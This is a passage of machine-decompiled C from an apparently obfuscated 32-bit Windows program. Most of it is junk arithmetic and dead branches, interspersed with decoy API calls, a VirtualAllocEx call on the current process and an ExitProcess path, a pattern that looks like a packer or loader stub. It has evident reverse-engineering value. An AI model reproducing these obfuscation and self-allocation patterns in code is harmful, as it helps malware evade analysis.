			if (*(ebp - 88) <= eax_171)
			{
				uint32 v55_2534 = *(ebp - 0x54);
				*(ebp - 0x54) = v55_2534;
				*(ebp - 88) = *(ebp - 88) - (v55_2534 < 0x00);
				*(ebp - 88) = *(ebp - 88) & 0x00;
				ui32 edx_2543 = *(ebp - 0x50) & 0x00;
				*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
				uint32 edx_2548 = (edx_2543 & *(ebp - 0x54)) + *(ebp - 0x50);
				edx_167 = (byte) (edx_2548 < 0x00) + (edx_2548 + *(ebp - 0x54)) + *(ebp - 88);
			}
			*(ebp - 0x50) = *(ebp - 0x50);
			*(ebp - 88) = *(ebp - 88);
			*(ebp - 88) = *(ebp - 88) - 0x01;
			ui32 eax_200 = *(ebp - 0x54);
			ui32 ecx_201 = ((eax_171 | ~0x00) ^ eax_171) - *(ebp - 0x54) | eax_200;
			*(ebp - 0x54) = *(ebp - 0x54) + 0x01;
			*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
			ui32 ecx_209 = ecx_201 ^ eax_200 ^ eax_200 | eax_200 | eax_200;
			*(ebp - 0x54) = *(ebp - 0x54) + ecx_209;
			*(ebp - 88) = ecx_209;
			uint32 v65_216 = *(ebp - 88) - ecx_209;
			*(ebp - 88) = v65_216;
			*(ebp - 88) = (word32) ((byte) (v65_216 < 0x00) + (*(ebp - 88) + ecx_209));
			ui32 eax_222 = *(ebp - 88);
			ui32 edx_223 = edx_167 | eax_222;
			*(ebp - 88) = *(ebp - 88) | edx_223;
			*(ebp - 0x54) = *(ebp - 0x54) | edx_223;
			uint32 eax_232 = eax_222 - *(ebp - 0x50) + *(ebp - 0x50);
			ui32 eax_239 = (eax_232 - *(ebp - 0x50) - (eax_232 < 0x00) + *(ebp - 0x54) ^ 0x00) - 0x01;
			uint32 v69_242 = *(ebp - 88) - ~0x08FF;
			*(ebp - 88) = v69_242;
			ui32 edx_252 = 0x04FB - *(ebp - 88) - ((byte) (v69_242 < 0x00) + (*(ebp - 0x54) + ~0x08FF) < 0x00) + ecx_209 + ecx_209;
			*(ebp - 0x54) = *(ebp - 0x54) + 0x01;
			*(ebp - 0x50) = *(ebp - 0x50) + ecx_209;
			*(ebp - 0x50) = *(ebp - 0x50) & edx_252;
			uint32 edx_261 = edx_252 - 0x1500 & ecx_209;
			Eq_4033 C_2531 = cond(edx_261 - 0x0C20);
			if (edx_261 == 0x0C20)
			{
				*(ebp - 0x54) = *(ebp - 0x54);
				*(ebp - 0x50) = *(ebp - 0x50);
				ecx_209 = 0x00;
				C_2531 = cond(edx_261 - 0x0936);
			}
			*(ebp - 0x54) = *(ebp - 0x54) - 0x01;
			*(ebp - 88) = (word32) C_2531 + (*(ebp - 88) + ecx_209);
			uint32 ecx_2468 = ecx_209 - 0x90;
			uint32 edx_285 = 0x0444 - *(ebp - 0x54) - (ecx_2468 < 0x00) - ecx_2468;
			*(ebp - 0x50) = edx_285;
			*(ebp - 0x54) = *(ebp - 0x54) - edx_285;
			*(ebp - 88) = *(ebp - 88) + 0x01;
			*(ebp - 0x50) = *(ebp - 0x50) & edx_285;
			*(ebp - 88) = *(ebp - 88) ^ ecx_2468;
			if (*(ebp - 0x50) <= edx_285)
			{
				ecx_2468 = *(ebp - 0x54) ^ ~0xEE | *(ebp - 0x50);
				uint32 edx_2504 = edx_285 + ecx_2468;
				*(ebp - 0x54) = *(ebp - 0x54) | edx_2504;
				*(ebp - 88) = *(ebp - 88) | edx_2504;
			}
			uint32 v83_308 = *(ebp - 88);
			*(ebp - 88) = v83_308;
			*(ebp - 0x54) = *(ebp - 0x54) - (v83_308 < 0x00);
			uint32 edx_315 = ~0x00 - ecx_2468;
			if (edx_315 + 0x01 != *(ebp - 0x50))
			{
				word32 ecx_2472 = *(ebp - 88);
				uint32 v85_2473 = *(ebp - 0x54) + ecx_2472;
				*(ebp - 0x54) = v85_2473;
				*(ebp - 88) = ecx_2472;
				*(ebp - 0x50) = (word32) ((byte) (v85_2473 < 0x00) + (*(ebp - 0x50) + ecx_2472));
				ecx_2468 = ecx_2472 - 0x01 ^ edx_315 + 0x01 ^ *(ebp - 0x50);
				*(ebp - 0x54) = *(ebp - 0x54) + (edx_315 + 0x01);
				if (edx_315 < ~0x09D9)
				{
l004158E7:
					uint32 edx_331 = *(ebp - 88) + 202 + eax_239;
					*(ebp - 0x54) = *(ebp - 0x54) + 0x01;
					*(ebp - 0x54) = *(ebp - 0x54) | edx_331 - 0x01;
					ui32 ecx_2428 = ecx_2468 - (edx_315 + 0x01) + (edx_315 + 0x01) | edx_315 + 0x01;
					ui32 edx_2381 = edx_331 - 0x01;
					if (edx_331 != 0x0FB5)
					{
						*(ebp - 0x50) = *(ebp - 0x50);
						*(ebp - 88) = *(ebp - 88) - 0x01;
						word32 eax_2446 = edx_331 - 0x01 + *(ebp - 0x54);
						if (edx_331 - 0x01 >= *(ebp - 0x50))
							*(ebp - 88) = *(ebp - 88) ^ eax_2446 - 0x01;
					}
					ui32 eax_352 = *(ebp - 0x50) ^ ecx_2428;
					*(ebp - 88) = *(ebp - 88) - eax_352;
					uint32 eax_356 = eax_352 - ecx_2428;
					if (eax_356 == 0x00)
					{
						ui32 ecx_2422 = *(ebp - 88);
						*(ebp - 0x50) = (word32) ((byte) (eax_356 < 0x00) + (*(ebp - 0x50) + ecx_2422));
						*(ebp - 88) = ecx_2422;
						*(ebp - 0x54) = *(ebp - 0x54) + ecx_2422;
						ecx_2428 = ecx_2422 & eax_356;
						if (*(ebp - 0x50) <= eax_356)
							*(ebp - 88) = *(ebp - 88) ^ eax_356;
					}
					*(ebp - 88) = *(ebp - 88) | 226;
					*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
					*(ebp - 0x54) = *(ebp - 0x54) & 226;
					*(ebp - 0x50) = *(ebp - 0x50) + 0x01;
					*(ebp - 88) = *(ebp - 88) + 0x01;
					ui32 ecx_2413 = ecx_2428 - 0x4C;
					if (false)
					{
						*(ebp - 0x50) = *(ebp - 0x50) | ecx_2413;
						ui32 ecx_2397 = (*(ebp - 0x54) & 166) - *(ebp - 88);
						ui32 eax_2399 = ecx_2397 | ~0x18A9 | ecx_2397;
						*(ebp - 0x50) = *(ebp - 0x50) & eax_2399;
						*(ebp - 0x54) = *(ebp - 0x54) + 0x01;
						*(ebp - 88) = *(ebp - 88) & eax_2399;
						*(ebp - 0x54) = *(ebp - 0x54) - eax_2399;
						ecx_2413 = ecx_2397 | *(ebp - 88);
					}
					ui32 ecx_399 = ecx_2413 - *(ebp - 0x50);
					*(ebp - 0x54) = *(ebp - 0x54) | edx_331 - 0x01;
					uint32 v109_407 = *(ebp - 0x54) - (edx_331 - 0x01);
					*(ebp - 0x54) = v109_407;
					*(ebp - 0x50) = *(ebp - 0x50) - (edx_331 - 0x01) - (v109_407 < 0x00);
					*(ebp - 88) = *(ebp - 88) & 0x4F;
					uint32 eax_417 = (edx_331 - 0x01 | 0x4F) - (edx_331 - 0x01);
					if (eax_417 < 22)
					{
						*(ebp - 0x54) = *(ebp - 0x54) & eax_417;
						*(ebp - 0x50) = *(ebp - 0x50) ^ eax_417;
						*(ebp - 88) = *(ebp - 88) & eax_417;
						edx_2381 = *(ebp - 0x50) | ~0x8D;
						*(ebp - 88) = *(ebp - 88) - 0x01;
					}
					ui32 edx_2345 = edx_2381 & 0x00;
					uint32 eax_431 = (0x00 - *(ebp - 88) | edx_2345) - 0x01 - edx_2345;
					*(ebp - 88) = (word32) ((byte) (eax_431 < 0x00) + (*(ebp - 88) + eax_431));
					*(ebp - 0x54) = *(ebp - 0x54) + eax_431;
					*(ebp - 88) = v118;
					ui32 eax_2361 = eax_431 & edx_2345;
					if (true)
					{
						edx_2345 = *(ebp - 88) + 0x0104 + *(ebp - 0x50);
						*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
						ui32 eax_2348 = eax_2361 + edx_2345 + edx_2345 + 100 | edx_2345;
						*(ebp - 0x50) = *(ebp - 0x50) | eax_2348;
						*(ebp - 88) = *(ebp - 88) + eax_2348;
						*(ebp - 0x54) = edx_2345;
						*(ebp - 0x54) = *(ebp - 0x54) | eax_2348;
						eax_2361 = eax_2348 & edx_2345;
					}
					*(ebp - 0x54) = *(ebp - 0x54) + eax_2361;
					*(ebp - 0x50) = *(ebp - 0x50) ^ eax_2361;
					*(ebp - 88) = *(ebp - 88) ^ eax_2361;
					*(ebp - 0x54) = *(ebp - 0x54) - edx_2345;
					uint32 eax_470 = *(ebp - 88) + *(ebp - 0x50) - 0xC2 - edx_2345;
					if (eax_470 >= 0x86)
					{
						*(ebp - 0x50) = *(ebp - 0x50) ^ 0x00;
						ui32 eax_2329 = eax_470 ^ ((eax_470 ^ 0x00 | eax_470) + *(ebp - 0x50) ^ *(ebp - 0x54));
						*(ebp - 0x50) = *(ebp - 0x50) + eax_2329;
						*(ebp - 0x54) = *(ebp - 0x54) + eax_2329;
					}
					ui32 eax_482 = *(ebp - 88);
					*(ebp - 0x50) = eax_482 - 0x01;
					*(ebp - 88) = *(ebp - 88) + (eax_482 - 0x01);
					uint32 eax_487 = eax_482 - 0x01 & ecx_399;
					*(ebp - 0x50) = *(ebp - 0x50) + (eax_487 + 0x1500);
					ui32 eax_2290 = eax_487 + 0x1500;
					if (*(ebp - 0x50) < eax_487 + 0x1500)
					{
						*(ebp - 88) = ecx_399;
						*(ebp - 0x50) = *(ebp - 0x50) + ecx_399;
						*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
						*(ebp - 88) = 0x00;
						ui32 eax_2298 = eax_487 + 0x1500 ^ ecx_399;
						*(ebp - 0x54) = eax_2298 + 0x01;
						*(ebp - 0x54) = eax_2298 + 0x01;
						*(ebp - 0x54) = *(ebp - 0x54) + (eax_2298 + 0x01);
						eax_2290 = eax_2298 + 0x01;
					}
					*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
					uint32 ecx_504 = eax_2290 & 0x01;
					if (ecx_504 == *(ebp - 88))
					{
						word32 eax_2283 = *(ebp - 88);
						*(ebp - 0x54) = *(ebp - 0x54) + eax_2283;
						*(ebp - 0x54) = eax_2283;
						eax_2290 = eax_2283 + 0x0EE7 - *(ebp - 0x50) - *(ebp - 0x54);
						*(ebp - 0x50) = *(ebp - 0x50) + ecx_504;
					}
					ui32 ecx_513 = ecx_504 & eax_2290;
					ui32 edx_516 = 0x00 - *(ebp - 0x54) | ecx_513;
					*(ebp - 0x54) = *(ebp - 0x54) - 0x01;
					if (((edx_516 | ecx_513 | ecx_513) & *(ebp - 88)) <= *(ebp - 88))
					{
						*(ebp - 0x54) = *(ebp - 0x54) | 2472;
						*(ebp - 88) = *(ebp - 88) + 2472;
					}
					GetCommandLineA();
					*(ebp - 0x54) = (union Eq_66 *) GetModuleHandleA(null);
					GetOEMCP();
					GetOEMCP();
					VirtualAllocEx((void *) ~0x00, 0x00, 0x0B00, *(ebp - 0x54), *(ebp - 88));
					Eq_85 esi_561 = *(ebp - 88);
					IsChild(esi_561, *(ebp - 0x54));
					*(ebp - 0x50) = (union Eq_35 *) GetCursor();
					GetVersionExA(ebp - 0x50);
					*(ebp - 0x50) = (union Eq_35 *) GetOEMCP();
					GetVersionExA(ebp - 88);
					*(ebp - 0x54) = (int32) GetVersionExA(ebp - 0x50);
					Eq_5354 edx_2250 = ebp - 0x50;
					uint32 ecx_591 = ebp - 0x50 ^ ebp - 0x50;
					if (ecx_591 <= 0x18E3)
					{
						*(ebp - 0x54) = *(ebp - 0x54) - 0x01;
						*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
						*(ebp - 0x54) = 0x00;
						*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
						ui32 edx_2239 = *(ebp - 88) ^ ~0x00 ^ *(ebp - 88);
						*(ebp - 0x50) = *(ebp - 0x50) - 0x01;
						uint32 v148_2244 = *(ebp - 0x50) - edx_2239;
						*(ebp - 0x50) = v148_2244;
						*(ebp - 0x50) = *(ebp - 0x50) - edx_2239 - (v148_2244 < 0x00);
						*(ebp - 0x54) = *(ebp - 0x54) + 0x01;
						edx_2250 = edx_2239 & (ecx_591 + 0x2A00 & edx_2239);
						*(ebp - 0x50) = *(ebp - 0x50) & edx_2250;
						*(ebp - 0x54) = (word32) edx_2250 + *(ebp - 0x54);
						*(ebp - 0x54) = *(ebp - 0x54) + 0x01;
					}
					*(ebp - 0x54) = *(ebp - 0x54) | edx_2250;
					*(ebp - 88) = (word32) edx_2250 + *(ebp - 88);
					*(ebp - 0x54) = *(ebp - 0x54) ^ edx_2250;
					*(ebp - 0x50) = *(ebp - 0x50) & edx_2250;
					*(ebp - 0x54) = (union Eq_5354 *) edx_2250;
					*(ebp - 0x50) = (union Eq_35 *) GetOEMCP();
					Eq_66 eax_619 = GetModuleHandleA(null);
					*(ebp - 0x50) = (union Eq_66 *) eax_619;
					uint32 ecx_626 = *(ebp - 0x54) ^ 0x26;
					*(ebp - 0x50) = *(ebp - 0x50) ^ ecx_626 + 0x07;
					*(ebp - 0x54) = *(ebp - 0x54) - (ecx_626 + 0x07);
					ui32 ecx_2215 = ecx_626 + 131;
					if (*(ebp - 88) > ecx_626 + 131)
					{
						*(ebp - 0x54) = *(ebp - 0x54);
						uint32 ecx_2214 = ecx_626 + 131 ^ 0x00;
						ecx_2215 = ecx_2214 - 0x01;
						if (ecx_2214 - 0x01 >= *(ebp - 0x54))
							*(ebp - 88) = *(ebp - 88) ^ ecx_2214 - 0x01;
					}
					ui32 ecx_644 = ecx_2215 | *(ebp - 0x50);
					*(ebp - 0x50) = *(ebp - 0x50) + (eax_619 ^ 0x0D33);
					*(ebp - 0x54) = *(ebp - 0x54) + (eax_619 ^ 0x0D33);
					*(ebp - 88) = *(ebp - 88) + (eax_619 ^ 0x0D33);
					*(ebp - 88) = *(ebp - 88) - 0x01;
					ui32 edx_675 = *(ebp - 0x54) - 0x01 | ecx_644;
					*(ebp - 0x54) = *(ebp - 0x54) & ecx_644;
					*(ebp - 0x54) = *(ebp - 0x54) - ecx_644;
					uint32 ecx_681 = ecx_644 + *(ebp - 88);
					ui32 ecx_684 = (byte) (ecx_681 < 0x00) + (ecx_681 + *(ebp - 0x50));
					uint32 edx_691 = (edx_675 + ecx_684 - 116 | ecx_684) + 0x0E65 - *(ebp - 0x50);
					word32 ecx_688 = *(ebp - 0x54);
					uint32 v168_694 = (byte) (edx_691 < 0x00) + (*(ebp - 88) + edx_691);
					*(ebp - 88) = v168_694;
					*(ebp - 0x54) = (word32) ((byte) (v168_694 < 0x00) + (*(ebp - 0x54) + ecx_688));
					ptr32 esp_701;
					word32 eax_702;
					word32 * ebp_703;
					byte SCZO_704;
					word32 ecx_705;
					byte SZO_706;
					byte CZ_707;
					byte C_708;
					ui32 edx_709;
					byte Z_710;
					word32 esi_711;
					word32 edi_712;
					struct Eq_5802 * fs_713;
					byte cl_714;
					byte ch_715;
					word32 ebx_716;
					MSVCRT.dll!log10();
					*(ebp_703 - 0x0C) = ecx_705;
					ui32 eax_719 = *(ebp_703 - 0x50);
					ui32 edx_721 = edx_709 + 161 | eax_719;
					uint32 edx_2185 = edx_721 - 0x51;
					uint32 eax_2189 = (eax_719 - *(ebp_703 - 0x50) + (edx_721 - 0x51) - 66 | edx_721 - 0x51) + *(ebp_703 - 88);
					if (*(ebp_703 - 88) > eax_2189)
					{
						*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - (edx_721 - 0x51);
						*(ebp_703 - 88) = *(ebp_703 - 88) + 0x01;
						edx_2185 = (eax_2189 + 0x035B ^ *(ebp_703 - 0x50)) - *(ebp_703 - 0x50);
						eax_2189 = eax_2189 - 0x01 - edx_2185 - edx_2185;
						*(ebp_703 - 88) = eax_2189;
						uint32 v172_2196 = *(ebp_703 - 88) - edx_2185 - (eax_2189 < 0x00);
						*(ebp_703 - 88) = v172_2196;
						*(ebp_703 - 0x50) = (word32) ((byte) (v172_2196 < 0x00) + (*(ebp_703 - 0x50) + edx_2185));
						*(ebp_703 - 0x50) = *(ebp_703 - 0x50) ^ edx_2185;
					}
					ui32 edx_739 = edx_2185 | *(ebp_703 - 88);
					*(ebp_703 - 0x54) = eax_2189;
					*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + eax_2189;
					*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x01;
					ui32 eax_748 = eax_2189 ^ *(ebp_703 - 88);
					uint32 v177_753 = *(ebp_703 - 88);
					*(ebp_703 - 88) = v177_753;
					*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - (v177_753 < 0x00);
					*(ebp_703 - 0x54) = *(ebp_703 - 0x54) & 0x00;
					uint32 ecx_763 = eax_748 & 0x00 | eax_748;
					if (ecx_763 > 0x00)
					{
						word32 eax_2164 = *(ebp_703 - 0x54);
						*(ebp_703 - 0x54) = eax_2164;
						*(ebp_703 - 88) = (word32) ((byte) (ecx_763 < 0x00) + (*(ebp_703 - 88) + eax_2164));
						if ((eax_2164 ^ ecx_763 ^ ecx_763 ^ *(ebp_703 - 0x54)) < *(ebp_703 - 88))
						{
l00415CF2:
							GetCommandLineA();
							*(ebp_703 - 88) = *(ebp_703 - 88) & edx_739;
							ui32 eax_781 = *(ebp_703 - 0x50);
							*(ebp_703 - 88) = *(ebp_703 - 88) ^ ((eax_781 ^ 0x00) ^ eax_781);
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - eax_781;
							*(ebp_703 - 88) = *(ebp_703 - 88) | eax_781;
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x01;
							*(esp_701 - 0x04) = 0x00;
							*(ebp_703 - 88) = (union Eq_66 *) GetModuleHandleA(*(esp_701 - 0x04));
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x01;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - 0x01;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + 0x01;
							*(ebp_703 - 88) = *(ebp_703 - 88) | 114;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - 114;
							GetOEMCP();
							*(esp_701 - 0x04) = ebp_703 - 88;
							GetVersionExA(*(esp_701 - 0x04));
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) ^ 3613;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) ^ 0x0E1E;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + 0x01;
							*(ebp_703 - 0x50) = (word32) ((byte) ((*(ebp_703 - 88) | 0x0E1E) < 0x0E1E) + (*(ebp_703 - 0x50) + 0x0E1E));
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + 0x01;
							uint32 v196_846 = *(ebp_703 - 88) - 0x0E1E;
							*(ebp_703 - 88) = v196_846;
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x0E1E - (v196_846 < 0x00);
							*(ebp_703 - 88) = *(ebp_703 - 88) - 0x01;
							GetCursor();
							*(esp_701 - 0x04) = *(ebp_703 - 0x50);
							*(esp_701 - 0x08) = *(ebp_703 - 88);
							*(esp_701 - 0x0C) = 0x0A00;
							*(esp_701 - 0x10) = 0x00;
							*(esp_701 - 0x14) = ~0x00;
							VirtualAllocEx(*(esp_701 - 0x14), *(esp_701 - 0x10), *(esp_701 - 0x0C), *(esp_701 - 0x08), *(esp_701 - 0x04));
							word32 edx_870 = *(ebp_703 - 88);
							*(esp_701 - 0x04) = edx_870;
							*(esp_701 - 0x08) = *(ebp_703 - 88);
							IsChild(*(esp_701 - 0x08), *(esp_701 - 0x04));
							*(esp_701 - 0x04) = *(ebp_703 - 0x54);
							ui32 edi_881 = *(ebp_703 - 88);
							*(esp_701 - 0x08) = edi_881;
							IsChild(*(esp_701 - 0x08), *(esp_701 - 0x04));
							struct Eq_6493 * esi_886 = fs_713->ptr0030;
							ui32 edx_2143 = edx_870 + esi_886->dwFFFEE1D1;
							*(esp_701 - 0x04) = *(ebp_703 - 0x0C);
							int32 eax_1186 = lstrlenA(*(esp_701 - 0x04));
							uint32 ecx_901 = *(ebp_703 - 0x50);
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - (ecx_901 + 0x01) - (ecx_901 < 0x00);
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) & ecx_901 + 0x01;
							uint32 ecx_910 = ecx_901 + 0x01 & edx_2143;
							if (*(ebp_703 - 88) >= ecx_910)
							{
								*(ebp_703 - 88) = *(ebp_703 - 88);
								*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + 0x01;
								uint32 edx_2140 = 0x01 - ecx_910;
								edx_2143 = (ui32) ((byte) (edx_2140 < 0x00) + (edx_2140 + *(ebp_703 - 88)));
								if (edx_2143 == 0x00)
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + ecx_910;
							}
							if (eax_1186 != 0x05)
							{
								*(esp_701 - 0x04) = 0x09;
								*(esp_701 - 0x08) = 0x13;
								*(esp_701 - 0x0C) = ebp_703 - 88;
								*(esp_701 - 0x10) = ebp_703 - 0x54;
								*(esp_701 - 0x14) = ebp_703 - 88;
								int32 eax_936 = GetMenuItemCount(*(esp_701 - 0x14));
								*(esp_701 - 0x14) = 0x5E;
								*(esp_701 - 0x18) = 0x69;
								*(esp_701 - 0x1C) = ebp_703 - 0x50;
								*(esp_701 - 0x20) = 88;
								*(esp_701 - 0x24) = ebp_703 - 88;
								*(esp_701 - 0x28) = eax_936;
								GetKeyNameTextA(*(esp_701 - 0x28), *(esp_701 - 0x24), *(esp_701 - 0x20));
								*(esp_701 - 0x20) = 0x2F;
								*(esp_701 - 0x24) = 22;
								*(esp_701 - 0x28) = 0x4F;
								*(esp_701 - 44) = ebp_703 - 88;
								Eq_290 eax_962 = GetKeyboardState(*(esp_701 - 44));
								*(esp_701 - 44) = 0x5B;
								*(esp_701 - 0x30) = ebp_703 - 88;
								*(esp_701 - 0x34) = ebp_703 - 0x50;
								*(esp_701 - 0x38) = (int32) eax_962;
								GetKeyboardLayoutNameA(*(esp_701 - 0x38));
								*(esp_701 - 0x38) = 0x57;
								*(esp_701 - 0x3C) = 0x67;
								*(esp_701 - 0x40) = ebp_703 - 0x54;
								*(esp_701 - 0x44) = ebp_703 - 88;
								GetKeyboardLayout(*(esp_701 - 0x44));
								*(esp_701 - 0x44) = 0x54;
								*(esp_701 - 0x48) = ebp_703 - 0x54;
								*(esp_701 - 0x4C) = 0x69;
								GetMenuStringA(*(esp_701 - 0x4C), *(esp_701 - 0x48), *(esp_701 - 0x44), *(esp_701 - 0x40), *(esp_701 - 0x3C));
								*(esp_701 - 0x3C) = ebp_703 - 88;
								*(esp_701 - 0x40) = 0x5C;
								*(esp_701 - 0x44) = ebp_703 - 88;
								GetMenuState(*(esp_701 - 0x44), *(esp_701 - 0x40), *(esp_701 - 0x3C));
								*(esp_701 - 0x3C) = ebp_703 - 88;
								*(esp_701 - 0x40) = 0x1A;
								*(esp_701 - 0x44) = ebp_703 - 88;
								GetKeyboardLayoutList(*(esp_701 - 0x44), *(esp_701 - 0x40));
								*(esp_701 - 0x40) = 0x57;
								*(esp_701 - 0x44) = ebp_703 - 0x50;
								GetMenuItemCount(*(esp_701 - 0x44));
								*(esp_701 - 0x44) = 0x0E;
								*(esp_701 - 0x48) = ebp_703 - 88;
								*(esp_701 - 0x4C) = 88;
								*(esp_701 - 0x50) = 0x46;
								GetKeyboardLayoutList(*(esp_701 - 0x50), *(esp_701 - 0x4C));
								*(esp_701 - 0x4C) = 0x00;
								ExitProcess(*(esp_701 - 0x4C));
							}
							*(ebp_703 - 88) = *(ebp_703 - 88) + edx_2143;
							ui32 edx_1038 = edx_2143 - *(ebp_703 - 0x50);
							ui32 edx_1045 = (edx_1038 + 0xBB ^ *(ebp_703 - 0x54)) - *(ebp_703 - 0x54);
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - edx_1045;
							*(ebp_703 - 88) = *(ebp_703 - 88) - edx_1045;
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) ^ edx_1045;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | edx_1045;
							ui32 ecx_1041 = 0x01 - edx_1038 ^ edx_1038;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + ecx_1041;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | ecx_1041;
							ui32 ecx_1064 = ecx_1041 + *(ebp_703 - 0x54) ^ *(ebp_703 - 0x54);
							*(ebp_703 - 88) = *(ebp_703 - 88) + ecx_1064;
							*(ebp_703 - 88) = *(ebp_703 - 88) | ecx_1064;
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + (ecx_1064 - *(ebp_703 - 0x50) ^ *(ebp_703 - 0x50));
							uint32 edx_1080 = (0x00 - *(ebp_703 - 0x54) & *(ebp_703 - 88)) + *(ebp_703 - 0x54);
							*(ebp_703 - 88) = *(ebp_703 - 88) - *(ebp_703 - 0x50);
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) & edx_1080;
							*(ebp_703 - 88) = *(ebp_703 - 88) + edx_1080;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - edx_1080;
							uint32 ecx_1097 = *(ebp_703 - 0x54) & 0x00 ^ *(ebp_703 - 88);
							*(ebp_703 - 88) = *(ebp_703 - 88) + ecx_1097;
							uint32 ecx_1101 = ecx_1097 - 0x02;
							if (ecx_1097 - 0x02 < *(ebp_703 - 88))
							{
								*(ebp_703 - 88) = *(ebp_703 - 88) + 0x01;
								edx_1080 = (ecx_1097 - 0x02 & 0x00) + *(ebp_703 - 0x50);
								ecx_1101 = ecx_1097 - 0x02 ^ edx_1080;
								*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - ecx_1101;
								*(ebp_703 - 88) = *(ebp_703 - 88) & ecx_1101;
								*(ebp_703 - 88) = *(ebp_703 - 88) ^ ecx_1101;
							}
							ui32 edx_1113 = 166 - *(ebp_703 - 0x50) - (edx_1080 - ecx_1101 < 0x00);
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | ecx_1101;
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x01;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + 0x01;
							*(ebp_703 - 88) = edx_1113;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) & edx_1113;
							word32 edx_1131 = edx_1113 - *(ebp_703 - 0x50) + *(ebp_703 - 88);
							*(ebp_703 - 88) = *(ebp_703 - 88);
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50);
							*(ebp_703 - 88) = *(ebp_703 - 88);
							uint32 ecx_1141 = *(ebp_703 - 0x50) + 0x6A;
							*(ebp_703 - 88) = *(ebp_703 - 88) - ecx_1141 - (ecx_1141 < 0x00);
							ui32 ecx_1146 = ecx_1141 ^ edx_1131;
							if (true)
							{
								*(ebp_703 - 0x50) = 0x41;
								ui32 edx_2088 = (ecx_1146 | 66) + *(ebp_703 - 0x54);
								*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | (ecx_1146 & edx_2088) + 117;
								*(ebp_703 - 88) = *(ebp_703 - 88) - 0x01;
								*(ebp_703 - 88) = *(ebp_703 - 88) - edx_2088;
							}
							uint32 ecx_1172 = (*(ebp_703 - 0x54) & *(ebp_703 - 0x50)) - *(ebp_703 - 88) - 0x01 | eax_1186;
							*(ebp_703 - 88) = *(ebp_703 - 88) + ecx_1172;
							if (*(ebp_703 - 0x50) > ecx_1172 - 0x0E00)
							{
								*(ebp_703 - 0x50) = *(ebp_703 - 0x50) - 0x59 - (*(ebp_703 - 0x50) < ecx_1172 - 0x0E00);
								eax_1186 = 0x9A;
								if (ecx_1172 <= 3688)
								{
									*(ebp_703 - 0x50) = *(ebp_703 - 0x50) + 0x01;
									eax_1186 = ecx_1172 - 0x0E00 | 0x9A;
								}
							}
							*(ebp_703 - 0x50) = eax_1186;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + 0x01;
							ui32 eax_1190 = eax_1186 + 0x01;
							word32 ecx_1195 = *(ebp_703 - 0x54);
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) | eax_1190 - 0xB7;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) | eax_1190 - 0xB7;
							*(ebp_703 - 88) = *(ebp_703 - 88) + (eax_1190 - 0xB7);
							word32 ecx_1206 = ecx_1195 + (eax_1190 - 0xB7) - *(ebp_703 - 0x50);
							*(ebp_703 - 88) = *(ebp_703 - 88) + (ecx_1206 - 0x9C);
							ui32 eax_1191 = eax_1190 - 0xB7;
							ui32 ecx_1210 = ecx_1206 - 0x9D;
							if (true)
							{
								*(ebp_703 - 88) = *(ebp_703 - 88) - (eax_1190 - 0xB7);
								*(ebp_703 - 0x54) = *(ebp_703 - 0x54) - (eax_1190 - 0xB7);
								*(ebp_703 - 0x50) = *(ebp_703 - 0x50) & 121;
								eax_1191 = (ecx_1206 - 0x9D ^ ~0x1686) + *(ebp_703 - 88) + *(ebp_703 - 88);
								ecx_1210 = ecx_1206 - 0x9D - eax_1191 - 0x01 - eax_1191;
							}
							ui32 eax_1222 = eax_1191 - 0x01 | ecx_1210;
							uint32 edx_1231 = ((0x00 - *(ebp_703 - 0x54) | *(ebp_703 - 88)) & *(ebp_703 - 0x54)) + *(ebp_703 - 0x54) & eax_1222;
							*(ebp_703 - 88) = *(ebp_703 - 88) + 0x01;
							*(ebp_703 - 0x54) = *(ebp_703 - 0x54) + edx_1231;
							*(ebp_703 - 0x50) = *(ebp_703 - 0x50) | edx_1231;
							if (edx_1231 - 0x0B00 > *(ebp_703 - 88))
							{
								*(ebp_703 - 88) = 0x00;
								*(ebp_703 - 88) = *(ebp_703 - 88) + 0x01;
								ui32 edx_2007 = edx_1231 - 0x0B00 | eax_1222;
								ui32 edx_2016 = edx_2007 - 0x01 - edx_2007;
